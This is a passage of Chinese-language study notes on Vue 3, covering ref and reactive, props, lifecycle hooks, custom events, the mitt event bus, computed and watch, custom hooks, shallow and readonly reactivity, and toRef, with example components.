可以看到这个 RedImpl 中的 value 后面有三个点，说明这个 value 是有响应式的，并且这个 value 底层使用了 Object.defineProperty 完成了响应式，RedImpl 对象的 value 属性有对应的 set 和 get。当读取 RefImpl 对象的 value 属性时：get 执行；当修改 RefImpl 对象的 value 属性时：set 执行。

所以之前的代码可以这样写：

```vue
<template>
    <h2>姓名：{{ name }}</h2>
    <h2>年龄：{{ age }}</h2>
    <button @click="modify">modify</button>
</template>

<script>
import { ref } from "vue";

export default {
    name: "App",
    setup() {
        let name = ref("张三");
        let age = ref("520");

        function modify() {
            name.value = "李四";
            age.value = 50;
            console.log(111);
        }

        return {
            name,
            age,
            modify,
        };
    },
};
</script>
```

+ 在插值语法中，访问 RefImpl 对象时，不需要写 .value，只需要写 name 就可以了，会自动调用 value。
+ 写了 value 会取不到值

![image-20240503211510741](https://gitee.com/LowProfile666/image-bed/raw/master/img/202405032115113.png)

## ref函数实现对象响应式

测试一下改对象内部的属性是否会有响应式：

```vue
<template>
    <h2>姓名：{{ user.name }}</h2>
    <h2>年龄：{{ user.age }}</h2>
    <button @click="modify">modify</button>
</template>

<script>
import { ref } from "vue";

export default {
    name: "App",
    setup() {
        let user = {
            name: "zs",
            age: 12,
        };

        function modify() {
            user.name = "lisi";
            user.age = 22;
            console.log(111);
        }

        return {
            user,
            modify,
        };
    },
};
</script>
```

可以发现并没有响应式，说明对象也默认没有响应式处理：

![image-20240503212233739](https://gitee.com/LowProfile666/image-bed/raw/master/img/202405032122078.png)

使用 ref 包裹对象：

```js
let user = ref({
    name: "zs",
    age: 12,
});
console.log(user);
```

![image-20240503214009683](https://gitee.com/LowProfile666/image-bed/raw/master/img/202405032140023.png)

可以看到，user 的 value 就是一个代理对象 Proxy，那么就可以通过这个 Proxy 去访问目标对象中的属性，且做了响应式处理：

```vue
<template>
    <h2>姓名：{{ user.name }}</h2>
    <h2>年龄：{{ user.age }}</h2>
    <button @click="modify">modify</button>
</template>

<script>
import { ref } from "vue";

export default {
    name: "App",
    data() {
        return {
            name: "lisi",
        };
    },
    methods: {
        modify() {
            this.name = "zhangsan";
        },
    },
    setup() {
        let user = ref({
            name: "zs",
            age: 12,
        });

        function modify() {
            user.value.name = "lisi";
            user.value.age = 22;
            console.log(111);
        }

        return {
            user,
            modify,
        };
    },
};
</script>
```

![image-20240503214409608](https://gitee.com/LowProfile666/image-bed/raw/master/img/202405032144958.png)

如果 ref 包裹的是一个基本数据类型，那么响应式就是 Object.defineProperty 实现的；

如果 ref 包裹的是一个对象，那么响应式就是 Object.defineProperty + Proxy 实现的。

+ 如果是这样修改的话，则只使用了 Object.defineProperty 机制：

  ```js
  function modify() {
      user.value = {
          name : 'lisi',
          age : 23
      }
  }
  ```

  这只是改了 Proxy 对象，所以只走了 Object.defineProperty，修改 Proxy 中的属性式才会走 Proxy 机制。

如果在对象中再套对象的话，还会有响应式吗？

```vue
<template>
    <h2>姓名：{{ user.name }}</h2>
    <h2>年龄：{{ user.age }}</h2>
    <h2>城市：{{ user.addr.city }}</h2>
    <h2>街道：{{ user.addr.street }}</h2>
    <button @click="modify">modify</button>
</template>

<script>
import { ref } from "vue";

export default {
    name: "App",
    setup() {
        let user = ref({
            name: "zs",
            age: 12,
            addr: {
                city: "北京",
                street: "四合院",
            },
        });

        function modify() {
            user.value.name = "lisi";
            user.value.age = 22;
            user.value.addr.city = "重庆";
            user.value.addr.street = "磁器口";
            console.log(111);
        }

        return {
            user,
            modify,
        };
    },
};
</script>
```

点击后，发现是有响应式的：

![image-20240503215011511](https://gitee.com/LowProfile666/image-bed/raw/master/img/202405032150874.png)

说明 Proxy 实现的响应式，对象中的对象，都有响应式处理，底层是递归处理了。

## reactive函数实现响应式

ref 对对象做的响应式处理是通过 Object.defineProperty + Proxy 的，麻烦。

所以 ref 一般适合于基本数据类型。

对对象做响应式处理，一般用 reactive 函数。用 reactive 函数包裹起来的对象，直接就是一个 Proxy。而 Proxy 对象中的对象都是做了响应式处理的，是递归的。

reactive 函数不能用于基本数据类型，专门用于对象类型的。使用 ref 包裹对象，底层也是会调用 reactive 函数的。

测试一下，reactive 需要导入：

```vue
<template>
    <h2>姓名：{{ user.name }}</h2>
    <h2>年龄：{{ user.age }}</h2>
    <button @click="modify">modify</button>
</template>

<script>
import { reactive } from "vue";

export default {
    name: "App",
    setup() {
        let user = reactive({
            name: "zs",
            age: 12,
        });

        console.log(user);
        
        function modify() {
            user.name = "lisi";
            user.age = 22;
            console.log(111);
        }

        return {
            user,
            modify,
        };
    },
};
</script>
```

![image-20240503215956633](https://gitee.com/LowProfile666/image-bed/raw/master/img/202405032159999.png)

可以看到通过 reactive 包裹的对象直接是一个 Proxy 对象。

如果使用 reactive 包裹一个基本数据类型的话，不会有响应式处理，且会报警：

```js
let counter = reactive(100);
```

![image-20240503220214263](https://gitee.com/LowProfile666/image-bed/raw/master/img/202405032202614.png)

所以基本数据类型还是请用 ref。

另外，向用 reactive 包裹的对象中添加、删除属性，或通过下标操作数组都会有响应式处理，因为他是 Proxy 对象

```vue
<template>
  <h2>姓名：{{userProxy.name}}</h2>
  <h2>年龄：{{userProxy.age}}</h2>
  <h2>计数器：{{userProxy.counter}}</h2>
  <h2>城市：{{userProxy.addr.city}}</h2>
  <h2>街道：{{userProxy.addr.street}}</h2>
  <h2>test：{{userProxy.addr.a.b.c}}</h2>
  <h2>性别：{{userProxy.sex}}</h2>
  <h2>选课列表</h2>
  <ul>
    <li v-for="(c,index) in userProxy.courses" :key="index">
      {{index}}, {{c}}
    </li>
  </ul>
  <button @click="modifyUser">修改用户信息</button>
  <br>
  <button @click="addSex">添加sex属性</button>
  <br>
  <button @click="delSex">删除sex属性</button>
  <br>
  <button @click="modifyCourse">修改课程</button>
</template>

<script>
  import { reactive } from 'vue'
  export default {
    name : 'App',
    setup() {
      let userProxy = reactive({
        name : '张三',
        age : 30,
        counter : 200,
        addr : {
          city : '北京',
          street : '大兴区凉水河二街',
          a : {
            b : {
              c : 111
            }
          }
        },
        courses : ['语文', '数学', '英语']
      })

      console.log(userProxy)

      // methods
      function modifyUser(){
        userProxy.name = '李四'
        userProxy.age = 50
        userProxy.counter = 500
        userProxy.addr.city = '邯郸'
        userProxy.addr.street = '太极二路'
        userProxy.addr.a.b.c = 666
      }

      function addSex(){
        // 添加性别，会有响应式
        userProxy.sex = '男'
      }

      function delSex(){
        // 删除性别，会有响应式
        delete userProxy.sex
      }

      function modifyCourse(){
        // 通过数组下标修改数组，也会有响应式
        userProxy.courses[2] = '政治'
      }

      // 返回对象
      return {userProxy, modifyUser, addSex, delSex, modifyCourse}
    }
  }
</script>
```

## Vue3中的props

在 Vue2 中，父组件通过 props 给子组件传递数据。

在 Vue3 中，父组件给子组件传递数据：

```vue
<template>
    <User name="张三" age="20" :sex="sex"></User>
</template>

<script>
import { ref } from "vue";
import User from "./components/User.vue";

export default {
    name: "App",
    components: {
        User,
    },
    setup() {
        let sex = ref("男");

        return { sex };
    },
};
</script>
```

那么在子组件中还是使用 props 接收数据，但是如何在 setup 中使用接收到的数据呢，尤其是 setup 中没有 this：

```vue
<template>
    <h2>姓名：{{ name }}</h2>
    <h2>年龄：{{ age }}</h2>
    <h2>性别：{{ sex }}</h2>
</template>

<script>
export default {
    name: "User",
    props: ["name", "age", "sex"],
    setup(props) {
        console.log(props);
    },
};
</script>
```

![image-20240503231017051](https://gitee.com/LowProfile666/image-bed/raw/master/img/202405032310449.png)

setup 函数有两个参数，第一个参数是 props，并且从输出结果中可以看到，props 也是被包装成了一个 Proxy，也具有响应式。

且 props 在 setup 中不需要 return，可以直接使用（return 了也是一样的）。

## Vue3的生命周期

![image-20240503231220999](https://gitee.com/LowProfile666/image-bed/raw/master/img/202405032312405.png)

大差不差，但是 vue2 中的 destroyed 和 beforeDestroy 变成了 unmounted 和 beforeUnmount。并且在 beforeCreate 之前，就执行了 setup 函数。

组合式 API：往 setup 函数体中配置的 data、methods、computed、watch 等这些东西，就叫做组合式 API，composition API。

```js
export default {
    name: "User",
    setup(props) {
        // 在这里配置就是组合式API
        // 如ref、reactive都属于组合式API
    },
};
```

+ 集中在函数体中使用，表示一个完整的组合。

选项式 API：在 setup 外的对象体中配置的 data、methods、computed、watch 等这些东西，就叫做选项式 API，options API。

```js
export default {
    name: "User",
    // 在这里配置都属于选项式API
    setup(props) {
    },
};
```

在 Vue3 中，生命周期钩子函数有两种写法

+ 第一种：选项式 API，写在 setup 外的对象中，和 Vue2 的写法一样

  ```js
  export default {
      name : 'User',
      setup(){
          console.log('setup...')
      },
      // 选项式API
      beforeCreate(){
          console.log('beforeCreate')
      },
      created(){
          console.log('created')
      },
      beforeMount(){
          console.log('beforeMount')
      },
      mounted(){
          console.log('mounted')
      },
      beforeUpdate(){
          console.log('beforeUpdate')
      },
      updated(){
          console.log('updated')
      },
      beforeUnmount(){
          console.log('beforeUnmount')
      },
      unmounted(){
          console.log('unmounted')
      } 
  }
  ```

+ 第二种：组合式 API，写在 setup 函数体中

  ```js
  import {ref, onBeforeMount, onMounted, onBeforeUpdate, onUpdated, onBeforeUnmount, onUnmounted} from 'vue'
  export default {
      name : 'User',
      setup(){
          console.log('setup...')
          // 采用组合式API：生命周期钩子函数
          onBeforeMount(() => {
              console.log('onBeforeMount')    
          })
  
          onMounted(() => {
              console.log('onMounted')
          })
  
          onBeforeUpdate(() => {
              console.log('onBeforeUpdate')
          })
  
          onUpdated(() => {
              console.log('onUpdated')
          })
  
          onBeforeUnmount(() => {
              console.log('onBeforeUnmount')
          })
  
          onUnmounted(() => {
              console.log('onUnmounted')
          })
      },
  
      // 选项式API
      beforeCreate(){
          console.log('beforeCreate')
      },
      created(){
          console.log('created')
      },
  }
  ```

  组合式 API 的钩子函数的名称不一样了，且需要导入进来。

  如果是使用组合式 API 的话，生命周期钩子函数就少了两个：created、beforeCreated，因为用 setup 函数代替了这两个钩子。所以如果实在想写 created、beforeCreated 这两钩子，就用选项是 API 的方式写。

以后一般用组合式 API 的方式使用钩子。

## Vue3的自定义事件

为什么要自定义事件？为了组件之间的通信

+ 绑定事件方：接收数据
+ 触发事件方：发送数据

在 Vue3 中，父组件绑定事件：

```vue
<template>
    <User @event1="fun1"></User>
</template>

<script>
import User from "./components/User.vue";

export default {
    name: "App",
    components: {
        User,
    },
    setup() {
        function fun1(name, age) {
            alert(name + ", " + age);
        }
        return { fun1 };
    },
};
</script>
```

那么在 Vue2 中的子组件中，会通过 this.$emit 来触发事件，但是 vue3 中的 setup 中都没有 this，应该怎么触发事件？setup 函数有两个参数：

```vue
<template>
    <button @click="triggerEvent">触发事件</button>
</template>

<script>
export default {
    name: "User",
    setup(props, context) {
        function triggerEvent() {
            context.emit("event1", "张三", 50);
        }

        return {
            triggerEvent,
        };
    },
};
</script>
```

context 参数是组件的上下文，通过 context 调用 emit 方法可以触发事件。

![image-20240503234316555](https://gitee.com/LowProfile666/image-bed/raw/master/img/202405032343994.png)

## Vue3中的全局事件总线

在 vue2 中定义全局事件总线是这样的：

```js
new Vue({
   el: '#app',
   render: h => h(App),
   beforeCreate() {
      Vue.prototype.$bus = this
   }
})
```

在 Vue3 中需要借助第三方库：mitt，先安装这个库：

```
npm i mitt
```

接下来在 src 下新建一个目录，通常叫 utils，在 utils 下新建一个文件叫 event-bus.js：

```js
import mitt from "mitt";

export default mitt();
```

mitt 函数会返回一个 emitter 对象，所以这个 event-bus.js 就相当于导出了一个 emitter 对象，可以将这个 emitter 对象当作一个全局事件总线对象，有需要即可导入。

那么用 emitter 接收数据：

```vue
<template>
    <User></User>
</template>

<script>
import { onMounted } from "vue";
import emitter from "./utils/event-bus.js";
import User from "./components/User.vue";

export default {
    name: "App",
    components: {
        User,
    },
    setup() {
        onMounted(() => {
            emitter.on("event1", user => {
                alert(user.name + ", " + user.age);
            });
        });
    },
};
</script>
```

+ 注意，emitter.on 绑定回调函数的时候，该回调函数只能接收一个参数

用 emitter 发送数据：

```vue
<template>
    <button @click="triggerEvent">触发事件</button>
</template>

<script>
import emitter from "../utils/event-bus.js";

export default {
    name: "User",
    setup(props, context) {
        function triggerEvent() {
            emitter.emit("event1", { name: "张三", age: 50 });
        }

        return {
            triggerEvent,
        };
    },
};
</script>
```

![image-20240504000019430](https://gitee.com/LowProfile666/image-bed/raw/master/img/202405040000917.png)

那么怎么解绑全局事件总线上的事件呢？

清除所有的事件：

```js
emitter.all.clear();
```

清除指定的事件：

```js
emitter.off('event1');
```

## Vue3的计算属性

Vue3 的计算属性 computed 是一个组合式 API，说明它得写在 setup 函数中。

依旧使用计算属性来完成一个字符串反转的案例：

```vue
<template>
    反转前：<input type="text" v-model="data.name" />
    <br />
    反转后：<input type="text" v-model="reversedName" />
</template>

<script>
import { computed, reactive } from "vue";

export default {
    name: "App",
    setup() {
        let data = reactive({
            name: "",
        });

        let reversedName = computed(() => {
            return data.name.split("").reverse().join("");
        });

        return {
            data,
            reversedName,
        };
    },
};
</script>
```

+ computed() 函数返回的就是一个响应式的对象。

以上的计算属性是简写形式，完整的计算属性是有 set 方法的：

```vue
export default {
    name: "App",
    setup() {
        let data = reactive({
            name: "",
        });

        let reversedName = computed({
            get() {
                return data.name.split("").reverse().join("");
            },
            set(val) {
                console.log(666);
                data.name = val.split('').reverse().join('');
            },
        });

        return {
            data,
            reversedName,
        };
    },
};
```

+ get 方法在访问计算属性时调用，set 方法在修改计算属性的值时调用

计算属性最重要的特征是：只要计算属性关联的数据发生变化，计算属性的回调函数就会执行。所以计算属性关联的数据必须是具有响应式的。

## Vue3的监视属性

Vue3 的 watch 也是一个组合式 API。

Vue2 中的 watch ：

```vue
<template>
    <h1>计数器：{{ counter }}</h1>
    <button @click="counter++">+1</button>
</template>

<script>
export default {
    name: "App",
    data() {
        return {
            counter: 0,
        };
    },
    watch: {
        counter(newVal, oldVal) {
            console.log(newVal, oldVal);
        },
    },
};
</script>
```

+ 监视 counter 属性，被监视的属性必须是响应式的

+ 以上是简写方式的监视

+ 完整的写法：

  ```json
  watch: {
      counter: {
          immediate: true, // 初始的时候调用一次handler
          deep: true, // 开启深度监视
          handler(newVal, oldVal) {
              console.log(newVal, oldVal);
          },
      },
  },
  ```

### 监视ref数据

在 Vue3 中要做到这个监视（侦听），需要用到组合式 API watch：

```js
import { ref, watch } from "vue";

export default {
    name: "App",
    setup() {
        let counter = ref(0);
        watch(counter, (newVal, oldVal) => {
            console.log(newVal, oldVal);
        });
        return { counter };
    },
};
```

+ watch 函数的第一个参数是要监视的数据，第二个对象是监视的数据变化了后，要执行的函数

watch 还有第三个参数，是一个配置项，可以配置立即执行、深度监视等：

```js
watch(
    counter,
    (newVal, oldVal) => {
        console.log(newVal, oldVal);
    },
    {
        immediate: true,
        deep: true,
    }
);
```

如果想要监视多个数据，那就调用多次 watch：

```js
watch(
    counter,
    (newVal, oldVal) => {
        console.log(newVal, oldVal);
    },
    { immediate: true, deep: true }
);
watch(
    counter2,
    (newVal, oldVal) => {
        console.log(newVal, oldVal);
    },
    { immediate: true, deep: true }
);
```

如果在监视多个对象时，需要处理的逻辑是一样的，就可以使用数组的形式一次性监视多个属性，不需要写多次 watch：

```js
watch([counter, counter2], (newVal, oldVal) => {
    console.log(newVal, oldVal);
});
```

输出，两个参数也变成了数组，newVal 存放的是监视的所有内容的新数据，oldVal 存的是监视的所有内容的老数据：

![image-20240505154139149](https://gitee.com/LowProfile666/image-bed/raw/master/img/202405051541624.png)

### 监视reactive数据

ref 包裹的基本类型数据生成的是 RefImpl 对象；reactive 包裹生成的是 Proxy 对象。

监视一个 Proxy 对象的属性

```vue
<template>
    <h1>计数器：{{ data.counter }}</h1>
    <button @click="data.counter++">+1</button>
</template>

<script>
import { reactive, watch } from "vue";

export default {
    name: "App",
    setup() {
        let data = reactive({
            counter: 0,
        });

        watch(data, (newVal, oldVal) => {
            console.log(newVal, oldVal);
        });

        return {
            data,
        };
    },
};
</script>
```

![image-20240505154937747](https://gitee.com/LowProfile666/image-bed/raw/master/img/202405051549170.png)

注意：对于 reactive 获取的代理对象，在进行侦听的时候，只能获取 newVal，oldVal 获取不到，如上图。

对于 reactive 获取的代理对象来说，默认就是开启深度侦听的：

```vue
<template>
    <h1>计数器：{{ data.counter }}</h1>
    <h1>计数器2：{{ data.a.b.c.d.counter2 }}</h1>
    <button @click="data.counter++">+1</button>
    <button @click="data.a.b.c.d.counter2++">2号+1</button>
</template>

<script>
import { reactive, ref, watch } from "vue";

export default {
    name: "App",
    setup() {
        let data = reactive({
            counter: 0,
            a: {
                b: {
                    c: {
                        d: {
                            counter2: 0,
                        },
                    },
                },
            },
        });

        watch(data, (newVal, oldVal) => {
            console.log(newVal, oldVal);
        });

        return {
            data,
        };
    },
};
</script>
```

这种深度侦听是无法取消的，配置 deep:false 也不行。

如果不想有深度监视的效果，不想监视所有的属性，比如只想监视 counter 属性，不能直接将 data.counter 写在 watch 的第一个参数位置上，需要写成一个函数的形式，用这个函数返回要监听的属性：

```js
watch(
    () => data.counter,  // 要监听的属性
    (newVal, oldVal) => {  // 监听执行的函数
        console.log(newVal, oldVal);
    }
);
```

![image-20240505160111244](https://gitee.com/LowProfile666/image-bed/raw/master/img/202405051601693.png)

为什么这里第一个参数必须要写成函数形式？因为这个参数需要的是一个响应式的对象，如果用 data.counter 拿到的是一个数值，所以不行，如果写 data.a.b 是没问题的，因为 data.a.b 拿到的是一个对象

```js
watch(data.a.b, (newVal, oldVal) => {
    console.log(newVal, oldVal);
});
```

如果想要同时监视 counter 和 counter2 怎么做？使用数组形式。但是数组中还是要用函数返回的形式返回要监视的属性：

```js
watch([() => data.counter, () => data.a.b.c.d.counter2], (newVal, oldVal) => {
    console.log(newVal, oldVal);
});
```

![image-20240505160808242](https://gitee.com/LowProfile666/image-bed/raw/master/img/202405051608697.png)

另外，监视一个对象时，默认会开启深度监视，设置 deep 为 false 也无法取消，但是这种写法可以用 deep 来控制深度监视：

```js
watch(
    () => data.a.b,
    (newVal, oldVal) => {
        console.log(newVal, oldVal);
    },
    { deep: false }
);
```

用函数返回的形式可以使用 deep 配置项了来关闭深度监视。

总结：

+ 只要监视的是对象，都拿不到 oldVal，只能拿到 newVal；监视的是基本数据类型，可以拿到 oldVal。
+ 要想监视基本数据类型，只能使用函数返回的形式写，因为要求是个响应式对象。
+ 使用函数返回的形式返回一个对象，监视该对象可以关闭默认的深度监视。

### 监视ref包裹对象的数据

ref 包裹一个对象时，生成一个 RefImpl 对象，底层采用了 Object.defineProperty 和 Proxy，这个 RefImpl 对象有一个 Value 属性，这个 Value 属性就是一个 Proxy 对象，这个 Proxy 对象可以监视到吗？

ref 包裹一个基本数据类型时：

```js
let counter = ref(1);
watch(counter.value, (newVal, oldVal) => {
    console.log(newVal, oldVal);
});
```

这种写法是错误的，因为 counter 是一个 RefImpl 对象，counter.value 就是一个基本数据类型的 1，这是不可以监视的，只能直接监视 counter，或者使用函数返回的形式返回 counter.value（没必要）。

ref 包裹一个对象时：

```js
let data = ref({
    counter: 1
});
watch(data.value, (newVal, oldVal) => {
    console.log(newVal, oldVal);
});
```

这个是可以的，data 的 value 是一个 Proxy 对象，所以可以直接监视的，但是依旧拿不到 oldVal，且默认开启深度监视不能关闭。

但是如果只监视 data 对象的话：

```js
let data = ref({
    counter: 1
});
watch(data, (newVal, oldVal) => {
    console.log(newVal, oldVal);
});
```

会先发现现在监视不到 counter 的变化了，这说明 RefImpl 对象默认没有开启深度监视，且它是支持 deep 配置的。

### 新增的watchEffect

这是 Vue3 新增的一个组合式 API，也是用来监视的。

这个 watchEffect 函数中直接跟一个回调函数即可。他会在初始的时候和监视的数据发生变化时自动调用。

那么 watchEffect 会监听哪些属性呢？会监听它的回调函数中使用过的所有属性：

```vue
<template>
    <h1>计数器：{{ data.counter1 }}</h1>
    <button @click="data.counter1++">+1</button>
    <hr />
    <h1>计数器：{{ data.counter2 }}</h1>
    <button @click="data.counter2++">+1</button>
    <hr />
    <h1>计数器：{{ data.counter3 }}</h1>
    <button @click="data.counter3++">+1</button>
</template>

<script>
import { reactive, watchEffect } from "vue";

export default {
    name: "App",
    setup() {
        let data = reactive({
            counter1: 0,
            counter2: 100,
            counter3: 1000,
        });

        // 监视data.counter1, data.counter3这两个属性
        watchEffect(() => {
            console.log(data.counter1, data.counter3);
        });

        return {
            data,
        };
    },
};
</script>
```

初始时以及修改 counter2 的值时：

![image-20240505164039845](https://gitee.com/LowProfile666/image-bed/raw/master/img/202405051640353.png)

修改 counter1 和 counter3 的值时：

![image-20240505164118784](https://gitee.com/LowProfile666/image-bed/raw/master/img/202405051641271.png)

## Vue3的自定义钩子函数

hook 函数，hook 翻译为 钩子，用的时候把他勾出来使用。和 Vue2 的混入 mixin 差不多，都是为了代码的复用。

现在有一个求和的程序：

```vue
<template>
    数字1：<input type="number" v-model="data.num1" />
    <br />
    数字2：<input type="number" v-model="data.num2" />
    <br />
    总和：<input type="number" v-model="data.res" />
    <button @click="sum">求和</button>
</template>

<script>
import { reactive, ref } from "vue";

export default {
    name: "App",
    setup() {
        let data = reactive({
            num1: 0,
            num2: 0,
            res: 0,
        });

        function sum() {
            data.res = data.num1 + data.num2;
        }

        return {
            data,
            sum,
        };
    },
};
</script>
```

+ 注意，这里输入框的类型不是 number 的话，默认输入的数据是字符串，就需要将字符串转为数字，否则结果就是字符串拼接。

假如现在有很多个组件都要用到这个求和的代码，怎么办？可以用 Vue3 中的 hook 函数。

一般会将钩子放在一个目录中，所以在 src 下新建一个目录 hooks，在 hooks 下新建一个文件，文件名一般就为功能名，这里叫 sum.js，在这里面定义一个函数并暴露，然后将以上代码中需要复用的部分拿过来：

```js
import { reactive } from "vue";
export default function () {
    let data = reactive({
        num1: 0,
        num2: 0,
        res: 0,
    });

    function sum() {
        data.res = data.num1 + data.num2;
    }

    return {
        data,
        sum,
    };
}
```

然后在 App 组件中要使用的地方导入这个函数并使用即可：

```js
// 导入钩子
import sum from "./hooks/sum";

export default {
    name: "App",
    setup() {
        // 使用钩子
        let res = sum();
        // 返回对象
        return {
            ...res,
        };
    },
};
```

或者直接返回 sum()：

```js
return sum();
```

## 浅层次响应式

shallowRef：只给基本数据类型添加响应式。如果是对象，则不会支持响应式。

shallowReactive：对象的第一层支持响应式，第二层就不再支持了。

### shallowRef

对于基本数据类型来说，shallowRef 和 ref 没有区别：

```vue
<template>
    <h1>计数器：{{ counter }}</h1>
    <br />
    <button @click="counter++">+1</button>
</template>

<script>
import { ref, shallowRef } from 'vue';
export default {
    name: "App",
    setup() {
        // let counter = ref(1);
        let counter = shallowRef(1);

        return {
            counter,
        };
    },
};
</script>
```

数据本身就是基本数据类型了，不能再浅了。

但是对于对象来说：

```vue
<template>
    <h1>计数器：{{ data.counter }}</h1>
    <br />
    <button @click="data.counter++">+1</button>
</template>

<script>
import { ref, shallowRef } from "vue";
export default {
    name: "App",
    setup() {
        let data = ref({
            counter: 0,
        });
        console.log(data);
        return {
            data,
        };
    },
};
</script>
```

对象使用 ref 包裹时，一切正常：

![image-20240505171002004](https://gitee.com/LowProfile666/image-bed/raw/master/img/202405051710493.png)

如果是使用 shallowRef 包裹：

```js
let data = shallowRef({
    counter: 0,
});
```

counter 没有了响应式，且 data.value 不再是个 Proxy 对象，而是一个 Object：

![image-20240505171116121](https://gitee.com/LowProfile666/image-bed/raw/master/img/202405051711602.png)

所以对于对象来说，ref 是有响应式的，底层会创建 Proxy 对象；shallowRef 是没有响应式的，底层也不会创建 Proxy 对象。

有的时候，这个对象中的属性可能永远都不可能修改，如果要改，也是更换对象。显然这个时候可以使用 shallowRef，进行优化。更换对象这一步还是有响应式的。

### shallowReactive

对象的第一层支持响应式，第二层就不再支持了。

使用 reactive 包裹一个对象时，该对象中的所有属性都是有响应式的，是递归式的。

但是使用 shallowReactive 包裹一个对象时，只会给第一层做响应式。

```vue
<template>
<h2>计数器：{{data.a.b.c.counter}}</h2>
<button @click="data.a.b.c.counter++">点我加1</button>
<hr>
<h2>计数器：{{data.counter2}}</h2>
<button @click="data.counter2++">点我加1</button>
</template>

<script>
    import { reactive, shallowReactive } from 'vue'
    export default {
        name : 'App',
        setup(){
            let data = shallowReactive({
                counter2 : 1000,
                a : {
                    b : {
                        c : {
                            counter : 1
                        }
                    }
                }
            })

            return {data}
        }
    }
</script>
```

以上代码中，只会有 counter2 有响应式。

## 选项式API和组合式API的区别

组合式API：Composition API，是 Vue3 中的。

选项式API：Options API，是 Vue2 中的。

选项式 API 的关注点在一个一个选项上，就是一个一个的配置项上，data、computed、methods、watch 等都是一个配置项。关注点不在单独的一个功能上，比如 data 配置项中就可能放所有功能需要的数据：

```js
export default {
    name: "App",
    data() {
        return {
            // 功能1的data
            // 功能2的data
            //……
        };
    },
    methods: {
        // 功能1的method
        // 功能2的method
        //……
    },
    computed: {
        // 功能1的computed
        // 功能2的computed
        // ……
    },
    watch: {
        // 功能1的watch
        // 功能2的watch
        // ……
    },
};
```

假设以后要修改功能 1 ，那么就要对应修改 data、methods、computed、watch 中的功能 1 的代码，维护成本较高。所以说选项式 API 关注点不在功能上，在于配置项上。

组合式 API + hook 的关注点在功能上，一个 hook 是一个独立的功能，一个 hook 中有自己的 data、methods、computed、watch。将一个功能写成一个 js 文件，写成一个钩子函数，想使用功能 1 的时候，直接调用，想修改功能 1，也不会牵扯到其他的功能函数。

## 深只读与浅只读

只读：不可修改。

深只读：readonly

浅只读：shallowReadonly

应用场景：其它组件传递过来的数据，如果不希望你修改，你最好加上只读，以防以后不小心改了人家的数据。

现在有两个计数器，有两个按钮可以修改这个计数器：

```vue
<template>
    <h2>计数器：{{ data.counter1 }}</h2>
    <button @click="data.counter1++">点我加1</button>
    <hr />
    <h2>计数器：{{ data.a.b.c.counter2 }}</h2>
    <button @click="data.a.b.c.counter2++">点我加1</button>
</template>

<script>
import { reactive, shallowReactive } from "vue";
export default {
    name: "App",
    setup() {
        let data = reactive({
            counter1: 0,
            a: {
                b: {
                    c: {
                        counter2: 100,
                    },
                },
            },
        });

        return { data };
    },
};
</script>
```

现在两个 counter 都是具有响应式的，都可以正常的加 1。

### 深只读

具有响应式的对象中的所有的属性，包括子对象中的子对象中的属性，所有的值都是不能修改的。

只要添加以下代码，那么这两个计数器都不能再被修改了：

```vue
data = readonly(data);
```

+ readonly 函数需要先引入：

  ```js
  import { readonly } from "vue";
  ```

此时再修改会报错：

![image-20240505191820603](https://gitee.com/LowProfile666/image-bed/raw/master/img/202405051918675.png)

### 浅只读

具有响应式的对象中的第一层属性是只读的，其他层属性是可修改的：

```js
data = shallowReadonly(data);
```

使用了以上代码，那么 data 中的 counter1 不能被修改，因为它是 data 的第一层中的属性；counter2 可以被修改：

![image-20240505192100372](https://gitee.com/LowProfile666/image-bed/raw/master/img/202405051921748.png)

## 响应式数据判断

提供了四个函数来判断某个数据是否具有响应式：

+ isRef：检查某个值是否为 ref。
+ isReactive：检查一个对象是否是由 reactive() 或 shallowReactive() 创建的代理。
+ isProxy：检查一个对象是否是由 reactive()、readonly()、shallowReactive() 或 shallowReadonly() 创建的代理。
+ isReadonly：检查传入的值是否为只读对象。

## toRef和toRefs

### toRef

现有一段计数器的代码：

```vue
<template>
    <h2>计数器：{{ data.counter1 }}</h2>
    <button @click="data.counter1++">点我加1</button>
    <hr />
    <h2>计数器：{{ data.counter2 }}</h2>
    <button @click="data.counter2++">点我加1</button>
    <hr />
    <h2>计数器：{{ data.a.b.counter3 }}</h2>
    <button @click="data.a.b.counter3++">点我加1</button>
</template>

<script>
import { reactive } from "vue";
export default {
    name: "App",
    setup() {
        let data = reactive({
            counter1: 1,
            counter2: 100,
            a: {
                b: {
                    counter3: 1000,
                },
            },
        });

        return { data };
    },
};
</script>
```

![image-20240505193004811](https://gitee.com/LowProfile666/image-bed/raw/master/img/202405051930197.png)

在模板语句中，用到的数据都是以 data. 开始的，能不能将这个 data. 处理一下，可以在 setup 的返回值对象中进行指定：

```js
return {
    counter1: data.counter1,
    counter2: data.counter2,
    counter3: data.a.b.counter3,
};
```

然后模板语句中直接这样使用：

```vue
<template>
    <h2>计数器：{{ counter1 }}</h2>
    <button @click="counter1++">点我加1</button>
    <hr />
    <h2>计数器：{{ counter2 }}</h2>
    <button @click="counter2++">点我加1</button>
    <hr />
    <h2>计数器：{{ counter3 }}</h2>
    <button @click="counter3++">点我加1</button>
</template>
```

但是这样最开始显示没有问题，但是点击按钮时却没有了响应式，因为这样写相当于：

```js
return {
    counter1: 1,
    counter2: 100,
    counter3: 1000,
};
```

所以不能这样写。那可以这样写：

```js
return {
    counter1: ref(data.counter1),
    counter2: ref(data.counter2),
    counter3: ref(data.a.b.counter3),
};
```

这样写没有问题，功能可以实现，但是这样也就相当于新建了三个引用对象，和原先的 data 没有关系，相当于：

```js
return {
    counter1: ref(1),
    counter2: ref(100),
    counter3: ref(1000),
};
```

所以这种写法也不行。

需要使用 toRef，要先引入：

```js
import { toRef } from "vue";
```

语法格式：

```js
toRef(对象, '该对象中的属性名')
```

所以这样写：

```js
return {
    counter1: toRef(data, "counter1"),
    counter2: toRef(data, "counter2"),
    counter3: toRef(data.a.b, "counter3"),
};
```

![image-20240505194609348](https://gitee.com/LowProfile666/image-bed/raw/master/img/202405051946750.png)

可以输出一下 toRef 的结果是什么：

```js
console.log(toRef(data, "counter1"));
```

![image-20240505194729003](https://gitee.com/LowProfile666/image-bed/raw/master/img/202405051947389.png)

结果是一个 ObjectRefImpl 对象，这是一个引用对象，有 value 属性，并且 value 属性是响应式的。

